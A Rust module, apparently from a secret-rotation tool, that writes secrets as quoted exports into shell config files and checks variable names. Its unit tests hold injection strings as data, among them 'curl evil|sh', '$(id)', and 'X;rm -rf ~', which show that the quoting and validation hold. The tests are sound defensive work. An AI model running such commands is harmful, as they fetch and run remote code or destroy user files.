use anyhow::{Context, Result};
use std::fs;
use std::path::{Path, PathBuf};
use tracing::{debug, info, warn};

/// Updates environment variables in shell configuration files
#[allow(dead_code)]
pub struct EnvUpdater {
    /// Home directory of the user
    home_dir: PathBuf,
}

impl EnvUpdater {
    /// Create a new EnvUpdater for the current user
    pub fn new() -> Result<Self> {
        let home_dir = std::env::var("HOME")
            .context("HOME environment variable not set")?
            .into();

        Ok(Self { home_dir })
    }

    /// Create an EnvUpdater for a specific home directory
    ///
    /// This is useful for testing or when you need to update environment variables
    /// in a different user's home directory.
    #[allow(dead_code)]
    pub fn with_home_dir(home_dir: PathBuf) -> Self {
        Self { home_dir }
    }

    /// Update or add an environment variable in shell config files
    pub fn update_env_var(&self, var_name: &str, new_value: &str) -> Result<()> {
        info!("Updating environment variable: {}", var_name);
        validate_var_name(var_name)?;
        // Validate once up front so a bad value fails the command instead of
        // being logged as a per-file warning.
        shell_single_quote(new_value)?;

        // Common shell config files
        let config_files = vec![".bashrc", ".bash_profile", ".zshrc", ".profile"];

        let mut updated_count = 0;

        for config_file in config_files {
            let config_path = self.home_dir.join(config_file);

            if config_path.exists() {
                match self.update_in_file(&config_path, var_name, new_value) {
                    Ok(true) => {
                        info!("Updated {} in {}", var_name, config_file);
                        updated_count += 1;
                    }
                    Ok(false) => {
                        debug!("{} not found in {}, appending", var_name, config_file);
                        self.append_to_file(&config_path, var_name, new_value)?;
                        updated_count += 1;
                    }
                    Err(e) => {
                        warn!("Failed to update {}: {}", config_file, e);
                    }
                }
            }
        }

        if updated_count == 0 {
            warn!("No shell config files found or updated");
        }

        Ok(())
    }

    /// Update environment variable in a specific file
    fn update_in_file(&self, path: &Path, var_name: &str, new_value: &str) -> Result<bool> {
        let content = fs::read_to_string(path)
            .with_context(|| format!("Failed to read {}", path.display()))?;

        let export_pattern = format!("export {}=", var_name);
        let mut found = false;
        let mut new_content = String::new();

        for line in content.lines() {
            let trimmed = line.trim();

            // Check if this line exports our variable
            if trimmed.starts_with(&export_pattern)
                || trimmed.starts_with(&format!("{}=", var_name))
            {
                // Replace the line with the new value
                new_content.push_str(&export_line(var_name, new_value)?);
                found = true;
            } else {
                new_content.push_str(line);
                new_content.push('\n');
            }
        }

        if found {
            write_private(path, &new_content)?;
        }

        Ok(found)
    }

    /// Append environment variable to a file
    fn append_to_file(&self, path: &Path, var_name: &str, new_value: &str) -> Result<()> {
        let mut content = fs::read_to_string(path)
            .with_context(|| format!("Failed to read {}", path.display()))?;

        // Add a newline if the file doesn't end with one
        if !content.ends_with('\n') {
            content.push('\n');
        }

        // Add a comment and the new export
        content.push_str("\n# Auto-updated by secret rotator\n");
        content.push_str(&export_line(var_name, new_value)?);

        write_private(path, &content)?;

        Ok(())
    }

    /// Remove an environment variable from shell config files
    ///
    /// Note: This is primarily used for testing. For production use, consider
    /// manually editing shell config files or using standard shell utilities.
    #[allow(dead_code)] // Used in tests
    pub fn remove_env_var(&self, var_name: &str) -> Result<()> {
        info!("Removing environment variable: {}", var_name);

        let config_files = vec![".bashrc", ".bash_profile", ".zshrc", ".profile"];

        for config_file in config_files {
            let config_path = self.home_dir.join(config_file);

            if config_path.exists() {
                self.remove_from_file(&config_path, var_name)?;
            }
        }

        Ok(())
    }

    /// Remove environment variable from a specific file
    #[allow(dead_code)] // Used in tests
    fn remove_from_file(&self, path: &Path, var_name: &str) -> Result<()> {
        let content = fs::read_to_string(path)
            .with_context(|| format!("Failed to read {}", path.display()))?;

        let export_pattern = format!("export {}=", var_name);
        let bare_pattern = format!("{}=", var_name);

        let lines: Vec<&str> = content.lines().collect();
        let mut new_lines: Vec<&str> = Vec::with_capacity(lines.len());
        let mut i = 0;

        while i < lines.len() {
            let trimmed = lines[i].trim();

            // When we find the auto-update comment, check if the *next* non-empty line is
            // our variable's export. If so, skip both. If not, keep the comment.
            if trimmed == "# Auto-updated by secret rotator" {
                let next = lines.get(i + 1).map(|l| l.trim()).unwrap_or("");
                if next.starts_with(&export_pattern) || next.starts_with(&bare_pattern) {
                    i += 2; // skip comment + export
                    continue;
                }
            }

            if trimmed.starts_with(&export_pattern) || trimmed.starts_with(&bare_pattern) {
                i += 1;
                continue;
            }

            new_lines.push(lines[i]);
            i += 1;
        }

        let mut new_content = new_lines.join("\n");
        if !new_content.is_empty() {
            new_content.push('\n');
        }

        fs::write(path, new_content)
            .with_context(|| format!("Failed to write to {}", path.display()))?;

        Ok(())
    }
}

/// Derive an environment variable name from a secret path:
/// `my-app/db.creds` -> `MY_APP_DB_CREDS`.
pub fn env_var_name_for_path(secret_path: &str) -> String {
    secret_path
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() {
                c.to_ascii_uppercase()
            } else {
                '_'
            }
        })
        .collect()
}

/// Reject anything that isn't a POSIX shell variable name. The name is
/// written unquoted into rc files that every new shell sources.
fn validate_var_name(var_name: &str) -> Result<()> {
    let mut chars = var_name.chars();
    let valid_start = chars
        .next()
        .is_some_and(|c| c.is_ascii_alphabetic() || c == '_');
    if !valid_start || !chars.all(|c| c.is_ascii_alphanumeric() || c == '_') {
        anyhow::bail!(
            "Invalid environment variable name {:?}: use letters, digits and _, not starting with a digit",
            var_name
        );
    }
    Ok(())
}

/// Quote `value` for a POSIX shell so it is taken literally: no `$`, backtick
/// or `\` expansion. A secret is backend data and must never become code.
fn shell_single_quote(value: &str) -> Result<String> {
    if value.contains(['\n', '\r', '\0']) {
        anyhow::bail!(
            "Secret value contains a newline or NUL and cannot be written to a shell file"
        );
    }
    Ok(format!("'{}'", value.replace('\'', r"'\''")))
}

fn export_line(var_name: &str, value: &str) -> Result<String> {
    Ok(format!(
        "export {}={}\n",
        var_name,
        shell_single_quote(value)?
    ))
}

/// Write a shell config file that now holds a secret. On Unix the file is made
/// owner-only first, so the secret is never written into a world-readable file.
fn write_private(path: &Path, content: &str) -> Result<()> {
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = fs::metadata(path)
            .with_context(|| format!("Failed to stat {}", path.display()))?
            .permissions()
            .mode();
        if mode & 0o077 != 0 {
            warn!(
                "{} is readable by other users (mode {:o}); restricting it to 0600 because it now holds a secret",
                path.display(),
                mode & 0o777
            );
            fs::set_permissions(path, fs::Permissions::from_mode(0o600))
                .with_context(|| format!("Failed to restrict permissions on {}", path.display()))?;
        }
    }
    fs::write(path, content).with_context(|| format!("Failed to write to {}", path.display()))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shell_single_quote_prevents_expansion_and_breakout() {
        assert_eq!(shell_single_quote("ab$H1cd").unwrap(), "'ab$H1cd'");
        assert_eq!(
            shell_single_quote("x\"; curl evil|sh; \"").unwrap(),
            "'x\"; curl evil|sh; \"'"
        );
        assert_eq!(shell_single_quote("it's").unwrap(), r"'it'\''s'");
        assert!(shell_single_quote("a\nexport PATH=/tmp").is_err());
    }

    #[test]
    fn quoted_values_round_trip_through_a_real_shell() {
        for value in ["ab$H1cd", "$(id)`id`", "it's \"q\" \\n", "!@#$%^&*"] {
            let line = export_line("V", value).unwrap();
            let out = std::process::Command::new("sh")
                .arg("-c")
                .arg(format!("{line}printf %s \"$V\""))
                .output()
                .unwrap();
            assert_eq!(String::from_utf8(out.stdout).unwrap(), value);
        }
    }

    #[test]
    fn validate_var_name_rejects_non_identifiers() {
        assert!(validate_var_name("MY_SECRET").is_ok());
        assert!(validate_var_name("_x1").is_ok());
        for bad in ["", "1X", "MY-APP", "A B", "X;rm -rf ~", "X=1"] {
            assert!(validate_var_name(bad).is_err(), "{bad}");
        }
    }

    #[test]
    fn env_var_name_for_path_is_always_valid() {
        assert_eq!(env_var_name_for_path("my-app/db.creds"), "MY_APP_DB_CREDS");
        assert!(validate_var_name(&env_var_name_for_path("my-app/db")).is_ok());
    }
}
